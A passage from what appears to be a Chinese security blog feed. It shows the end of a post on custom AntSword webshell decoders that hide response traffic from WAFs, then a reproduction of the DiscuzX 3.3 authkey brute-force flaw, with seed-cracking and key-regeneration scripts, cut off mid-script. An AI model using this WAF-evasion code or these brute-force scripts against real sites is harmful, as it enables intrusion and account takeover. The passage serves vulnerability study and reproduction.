 * @param &#123;string&#125; data 要被解码的 Buffer   * @returns &#123;string&#125; 解码后的 Buffer   */</span>  <span class="token function-variable function">decode_buff</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> ext<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看下解码器的组成，这里导出了两个方法，<code>asoutput</code>及<code>decode_buff</code>。<code>asoutput</code>无需传入参数，返回一段php代码字符串，名称为<code>asenc</code>的函数，这个函数会放在请求包里，用于在服务端执行完代码后，再回显部分调用该函数asenc来编码处理，所以服务端无需针对解码做改动。</p><p>按照这个方式自写一个解码器：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">/** * php::base64自定义解码器 * Create at: 2020/05/22 10:21:48 */</span><span class="token string">'use strict'</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/**   * @returns &#123;string&#125; asenc 将返回数据base64编码   * 自定义输出函数名称必须为 asenc   * 该函数使用的语法需要和shell保持一致   */</span>  <span class="token function-variable function">asoutput</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">function asenc($out)&#123;      //返回时添加一个随机字符串，避免被waf解码成功      return 'wg4a2'.@base64_encode($out);    &#125;    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n\s+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token comment">/**   * 解码 Buffer   * @param &#123;string&#125; data 要被解码的 Buffer   * @returns &#123;string&#125; 解码后的 Buffer   */</span>  <span class="token function-variable function">decode_buff</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> ext<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">wg4a2</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用这个解码器时就会子啊返回的数据包中添加随机字符串，如下图，这样只有蚁剑客户端能够解码成功，而waf则不可以。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2022%2011%2031%2043.png" alt="20200522113143"></p><p>编写解码器的思路大概就是这样的，大家可以以各种骚思路去写自己的解码器。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>除了使用常规的编码，乱序操作去写编码器和解码器，还可以使用对称加密，非对称加密等算法写编码器和解码器来逃避waf的流量检测，这种做法其实和冰蝎就很类似了。这种思路对应的文章请看这两篇：</p><ul><li><a href="https://xz.aliyun.com/t/6571">蚁剑实现动态秘钥编码器解码器</a></li><li><a href="https://xz.aliyun.com/t/5756">关于对antSword(蚁剑)进行流量混淆处理的解决方案</a></li></ul><p><strong>刚开始研究蚁剑的编码器和解码器，文中有写的不对或者不好的地方还望各位师傅斧正</strong></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://xz.aliyun.com/t/7735">蚁剑改造过WAF系列（一）</a></li><li><a href="https://xz.aliyun.com/t/5756">关于对antSword(蚁剑)进行流量混淆处理的解决方案</a></li><li><a href="http://www.hackdig.com/03/hack-72681.htm">蚁剑改造计划之实现其他参数的随机化</a></li><li><a href="http://www.test666.me/archives/289/">[红队武器] - AntSword之特征修改与流量处理</a></li><li><a href="https://mp.weixin.qq.com/s/EHDvRA3Lpykpu0BDS17ENQ">AntSword编码器篇(一) HelloWorld​</a></li><li><a href="https://xz.aliyun.com/t/6571">蚁剑实现动态秘钥编码器解码器</a></li><li><a href="https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw">WAF拦了蚁剑发送的其它参数时怎么操作</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483991&idx=1&sn=7f5e52e8d8b7a00f7d2889d8a628ef10&chksm=e91c59afde6bd0b99bf22c5ef675828bc3202f2be23eea9e9519d4259af83a15f813c946bd47&mpshare=1&scene=23&srcid=0519DoTZK79rt9hiksYzCv47&sharer_sharetime=1589856866463&sharer_shareid=f5d04c386d841caa7b6a34a6658938ee%23rd">AntSword编码器篇(二)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AntSword </tag>
            
            <tag> 蚁剑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DiscuzX3.3 authkey可爆破漏洞复现</title>
      <link href="2020/05/12/discuzx3.3-authkey-blasting/"/>
      <url>2020/05/12/discuzx3.3-authkey-blasting/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在看了一个师傅写的 <code>Discuz_X authkey安全性漏洞分析</code>文章后，对其中的某些点还是有些模糊，于是决定下载DiscuzX3.3将authkey可爆破漏洞复现下，尽可能的说清楚复现的每一步及其利用的工具和脚本。</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><blockquote><p>2017年8月1日，Discuz!发布了X3.4版本，此次更新中修复了authkey生成算法的安全性漏洞，通过authkey安全性漏洞，我们可以获得authkey。系统中逻辑大量使用authkey以及authcode算法，通过该漏洞可导致一系列安全问题：邮箱校验的hash参数被破解，导致任意用户绑定邮箱可被修改等…</p></blockquote><p>漏洞影响版本：</p><ul><li>Discuz_X3.3_SC_GBK</li><li>Discuz_X3.3_SC_UTF8</li><li>Discuz_X3.3_TC_BIG5</li><li>Discuz_X3.3_TC_UTF8</li><li>Discuz_X3.2_SC_GBK</li><li>Discuz_X3.2_SC_UTF8</li><li>Discuz_X3.2_TC_BIG5</li><li>Discuz_X3.2_TC_UTF8</li><li>Discuz_X2.5_SC_GBK</li><li>Discuz_X2.5_SC_UTF8</li><li>Discuz_X2.5_TC_BIG5</li><li>Discuz_X2.5_TC_UTF8</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="authkey的产生"><a href="#authkey的产生" class="headerlink" title="authkey的产生"></a>authkey的产生</h3><p>在<code>install/index.php</code>中有关于authkey的产生方法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token constant">DZUCFULL</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token variable">$adminuser</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$authkey</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_ADDR'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$dbhost</span><span class="token operator">.</span><span class="token variable">$dbuser</span><span class="token operator">.</span><span class="token variable">$dbpw</span><span class="token operator">.</span><span class="token variable">$dbname</span><span class="token operator">.</span>                <span class="token variable">$username</span><span class="token operator">.</span><span class="token variable">$password</span><span class="token operator">.</span><span class="token variable">$pconnect</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$timestamp</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'db'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbhost'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$dbhost</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'db'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$dbname</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'db'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbpw'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$dbpw</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'db'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbuser'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$dbuser</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'db'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tablepre'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tablepre</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admincp'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'founder'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$uid</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'security'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'authkey'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$authkey</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookiepre'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'memory'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>authkey是由多个服务器变量，数据库信息md5的前6位加<code>random</code>函数生成的随机10位数，前6位数字我们无从得知，但是问题就出现在了<code>random</code>函数上，跟进<code>random</code>函数，<br>在<code>/ucserver/install/func.inc.php</code>中：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">;</span><span class="token variable">$max</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">PHP_VERSION</span> <span class="token operator">&lt;</span> <span class="token string single-quoted-string">'4.2.0'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span>double<span class="token punctuation">)</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$hash</span> <span class="token operator">.=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$hash</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到当PHP版本&gt;=4.2时，<code>mt_rand</code>的随机数种子是固定的。现在的思路是计算随机数种子，使用随机数种子生成 <code>authkey</code>，找到可以验证<code>authkey</code>是否正确的接口，爆破得出<code>authkey</code>。很幸运的是Discuz有很多地方使用到了<code>authkey</code>来生成一些信息，利用这点就可以验证<code>authkey</code>的正确性，这个我们后面会提到。</p><h3 id="关于mt-rand"><a href="#关于mt-rand" class="headerlink" title="关于mt_rand"></a>关于mt_rand</h3><blockquote><p>mt_rand() 函数使用 Mersenne Twister 算法生成随机整数。<br>该函数是产生随机值的更好选择，返回结果的速度是 rand() 函数的 4 倍。<br>如果您想要一个介于 10 和 100 之间（包括 10 和 100）的随机整数，请使用 mt_rand (10,100)。</p></blockquote><p>语法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">or</span><span class="token function">mt_rand</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ok，了解了<code>mt_rand</code>函数的用法后，我们使用<code>mt_rand</code>来生成10个1-100之间的随机数：</p><p>代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2013%2015%2035%2043.png" alt="20200513153543"></p><p>在运行一次：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2013%2015%2036%2020.png" alt="20200513153620"></p><p>可以看到两次运行产生的随机数竟然是一样的，我们把这个称为伪“随机数”，正是由于<code>mt_rand</code>函数的这种特性，我们才可以进行随机数的预测，关于”伪随机数”的详细介绍可以看看下面这两篇文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/62555467">PHP中的随机数安全问题</a></li><li><a href="https://xz.aliyun.com/t/31">PHP mt_rand()随机数安全</a></li></ul><h3 id="爆破随机数种子"><a href="#爆破随机数种子" class="headerlink" title="爆破随机数种子"></a>爆破随机数种子</h3><p>ok，了解了<code>mt_rand</code>函数后，需要做的就是爆破出随机数种子，在<code>/install/index.php</code>中可看到cookie的前缀的前四位也是由<code>random</code>函数生成的，而cookie我们是可以看到的：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookiepre'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2013%2015%2049%2041.png" alt="20200513154941"></p><p>cookie前缀为：CHFV</p><p>那我们就可以使用字符集加上4位已知字符，爆破随机数种子,爆破随机数种子的工具已经有人写出，地址为：<a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a>，关于此工具的使用方法可自行查阅。</p><p>首先使用脚本生成用于<code>php_mt_seed</code>工具的参数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>w_len <span class="token operator">=</span> <span class="token number">10</span>result <span class="token operator">=</span> <span class="token string">""</span>str_list <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str_list<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span>w_len<span class="token punctuation">)</span><span class="token punctuation">:</span>result<span class="token operator">+=</span><span class="token string">"0 "</span>result<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>result<span class="token operator">+=</span><span class="token string">" "</span>result<span class="token operator">+=</span><span class="token string">"0 "</span>result<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>result<span class="token operator">+=</span><span class="token string">" "</span>sstr <span class="token operator">=</span> <span class="token string">"CHFV"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> sstr<span class="token punctuation">:</span>result<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>str_list<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>result<span class="token operator">+=</span><span class="token string">" "</span>result<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>str_list<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>result<span class="token operator">+=</span><span class="token string">" "</span>result<span class="token operator">+=</span><span class="token string">"0 "</span>result<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>result<span class="token operator">+=</span><span class="token string">" "</span><span class="token keyword">print</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 2 2 0 61 7 7 0 61 5 5 0 61 21 21 0 61<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用php_mt_seed工具爆破随机数种子：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2013%2018%2004%2059.png" alt="20200513180459"></p><p>由于当前使用的php版本为5.6，符合结果的一共有293个。</p><h3 id="爆破authkey"><a href="#爆破authkey" class="headerlink" title="爆破authkey"></a>爆破authkey</h3><p>获得了随机数种子后，利用随机数种子使用<code>random</code>函数生成随机字符串用于后面的authkey爆破，生成随机字符串的脚本如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">;</span><span class="token variable">$max</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">PHP_VERSION</span> <span class="token operator">&lt;</span> <span class="token string single-quoted-string">'4.2.0'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span>double<span class="token punctuation">)</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$hash</span> <span class="token operator">.=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$hash</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'result1.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fp2</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'result2.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([=\s].*[=\s])(\d+)[\s]/"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$matach</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$matach</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// var_dump($matach);</span><span class="token comment">// var_dump($m);</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp2</span><span class="token punctuation">,</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如何验证authkey的正确性呢？我们注意到在找回密码时，系统给用户发送的邮件中的链接如下：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2013%2019%2016%2059.png" alt="20200513191659"></p><p>把目光转移到代码中，寻找sign值的生成方式，在<code>/source/module/member/member_lostpassw.php</code>有如下代码：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2013%2019%2020%2011.png" alt="20200513192011"></p><p>跟进到<code>make_getpws_sign</code>函数中：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2013%2019%2021%2047.png" alt="20200513192147"></p><p>继续跟进到<code>dsign</code>函数中：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2013%2019%2022%2054.png" alt="20200513192254"></p><p>发现<code>dsign</code>配合使用了authkey来生成sign值，那么我们接下来要做的就是模拟这个过程来获取找回密码处的<code>uid</code>,<code>id</code>,<code>sign</code>值来爆破authkey,下面是爆破脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding: utf-8</span><span class="token keyword">import</span> itertools<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">dsign</span><span class="token punctuation">(</span>authkey<span class="token punctuation">)</span><span class="token 